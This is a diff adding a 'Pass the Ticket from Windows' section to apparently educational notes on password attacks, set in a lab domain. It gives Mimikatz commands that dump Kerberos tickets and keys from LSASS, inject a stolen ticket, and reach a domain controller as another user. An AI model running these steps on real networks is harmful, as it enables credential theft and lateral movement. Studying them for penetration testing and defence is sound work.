@@ -29,6 +29,8 @@ This document outlines common techniques used in **password attacks**. It is int
     - [Credential Hunting in Network Traffic](#credential-hunting-in-network-traffic)
     - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
   - [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
+    - [Pass the Hash](#pass-the-hash)
+    - [Pass the Ticket from Window](#pass-the-ticket-from-windows)
 
 ---
 
@@ -2089,5 +2091,125 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62
 ```
 
 ![Filtered output](./.images/pth.PNG)
+
+---
+
+### Pass the Ticket from Windows
+
+Another Active Directory lateral movement technique is **Pass the Ticket (PtT)**. Instead of authenticating with an NTLM hash, PtT abuses Kerberos tickets.
+
+To perform a PtT attack, we need a valid Kerberos ticket. This can be:
+
+- A **Service Ticket (TGS)** - grants access to a specific service or resource
+- A **Ticket Granting Ticket (TGT)** - allows requesting additional service tickets for any domain resource
+
+#### Ticket Harvesting
+
+Assume we have obtained administrative privileges on a domain-joined system. Tools such as **Mimikatz** or **Rubeus** can be used to extract Kerberos tickets directly from LSASS.
+
+Harvest all available tickets with Mimikatz:
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+```
+
+![Filtered output](./.images/ptT.PNG)
+
+This exports multiple `.kirbi` ticket files:
+
+![Filtered output](./.images/ptt2.PNG)
+
+Example output:
+
+```
+ [0;6d014]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
+ [0;6d9f9]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
+ [0;6e319]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
+```
+
+These are **TGTs**, which can be reused to authenticate as the corresponding users.
+
+#### Pass the Key
+
+**Pass the Key (PtK) is closely related to PtT**. Instead of reusing an existing ticket, PtK leverages Kerberos encryption keys (NTLM / AES) to forge a new TGT.
+
+First, dump Kerberos keys from memory:
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+```
+
+![Filtered output](./.images/ptt3.PNG)
+
+This reveals values such as:
+
+- `AES256_HMAC`
+- `AES128_HMAC`
+- `RC4_HMAC (NTLM)`
+
+Using one of these keys, we can generate a fresh Kerberos session for the target user:
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+
+This spawns a new `cmd.exe` running in John’s security context, allowing Kerberos authentication as that user.
+
+![Filtered output](./.images/ptt4.PNG)
+
+#### Injecting Tickets (Pass the Ticket)
+
+Instead of forging a ticket, we can directly inject an exported `.kirbi` file into the current session.
+
+```powershell
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\tools\[0;6d9f9]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+```
+
+After importing the ticket, access domain resources as John:
+
+```powershell
+type \\DC01.inlanefreight.htb\john\john.txt
+```
+
+![Filtered output](./.images/ptt5.PNG)
+
+#### Pass the Ticket with PowerShell Remoting
+
+Kerberos tickets can also be used for PowerShell Remoting.
+
+First inject the ticket:
+
+```powershell
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\tools\[0;6d9f9]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+```
+
+Then connect to the Domain Controller:
+
+```powershell
+powershell
+Enter-PSSession -ComputerName DC01
+```
+
+![Filtered output](./.images/ptt6.PNG)
+
+#### Key Differences: PtH vs PtT vs PtK
+
+| Technique           | Uses                     | Result                  |
+| ------------------- | ------------------------ | ----------------------- |
+| **Pass the Hash**   | NTLM hash                | NTLM authentication     |
+| **Pass the Ticket** | Existing Kerberos ticket | Kerberos authentication |
+| **Pass the Key**    | Kerberos encryption key  | New forged TGT          |
 
 ---
